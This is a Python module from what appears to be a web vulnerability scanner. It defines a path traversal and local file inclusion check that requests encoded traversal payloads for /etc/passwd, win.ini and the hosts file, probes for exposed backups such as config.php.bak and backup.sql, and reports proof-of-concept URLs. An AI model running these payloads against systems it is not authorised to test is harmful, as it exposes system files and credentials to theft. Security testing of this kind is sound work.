from ..http_engine import HTTPEngine

class PathTraversalSkill:
    def __init__(self):
        self.name = "Path Traversal / LFI"
        # Generic Linux and Windows traversal payloads
        self.payloads = [
            "/../../../../../../etc/passwd",
            "/../../../../../../windows/win.ini",
            "/../../../../../../windows/system32/drivers/etc/hosts",
            "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/....//....//....//....//etc/passwd",
            "/etc/passwd",
            # Generic exposed backups
            "/index.php.bak",
            "/config.php.bak",
            "/web.config.bak",
            "/backup.sql"
        ]

    async def run(self, base_url: str, engine: HTTPEngine) -> list:
        findings = []
        root_url = base_url.rstrip('/')
        
        for payload in self.payloads:
            test_url = f"{root_url}{payload}"
            
            response = await engine.request("GET", test_url)
            
            if not response:
                continue
                
            if response.status_code == 200:
                text = response.text
                
                # Validation for Linux /etc/passwd
                if "root:x:0:0" in text:
                    poc = f"Open this URL to read the server's /etc/passwd file:\n{test_url}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Path Traversal (Linux) via {payload}",
                        "severity": "Critical",
                        "evidence": f"Successfully read /etc/passwd.",
                        "poc": poc
                    })
                    
                # Validation for Windows win.ini
                elif "[extensions]" in text.lower() and "[fonts]" in text.lower():
                    poc = f"Open this URL to read the server's win.ini file:\n{test_url}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Path Traversal (Windows) via {payload}",
                        "severity": "Critical",
                        "evidence": f"Successfully read win.ini.",
                        "poc": poc
                    })
                    
                # Validation for exposed backup files (e.g., config.php.bak)
                elif payload.endswith(('.bak', '.sql')) and ("password" in text.lower() or "db_" in text.lower() or "create table" in text.lower()):
                    # Ignore if it's just the SPA shell
                    if "<app-root>" in text or "<div id=\"root\">" in text:
                        continue
                        
                    poc = f"Open this URL to download the exposed backup file:\n{test_url}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Exposed Backup File: {payload}",
                        "severity": "High",
                        "evidence": f"Successfully accessed a backup file containing sensitive strings.",
                        "poc": poc
                    })
                    
        return findings
